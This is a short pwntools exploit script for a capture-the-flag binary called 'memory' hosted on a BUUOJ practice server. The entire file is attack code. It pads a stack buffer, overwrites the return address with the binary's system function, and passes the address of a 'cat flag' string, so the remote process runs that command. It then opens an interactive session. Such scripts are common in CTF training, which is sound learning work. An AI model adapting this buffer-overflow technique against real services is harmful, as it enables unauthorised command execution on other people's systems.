from pwn import *
context(log_level='debug')
#io = process("./memory")
io = remote("node3.buuoj.cn",27913)
elf = ELF("./memory")

system = elf.sym['system']
cat_flag = 0x080487E0
main = elf.sym['main']

#io.recvuntil("> ")

payload = 'a'*(0x13+4) + p32(system)+p32(main) + p32(cat_flag)
io.sendline(payload)
io.interactive()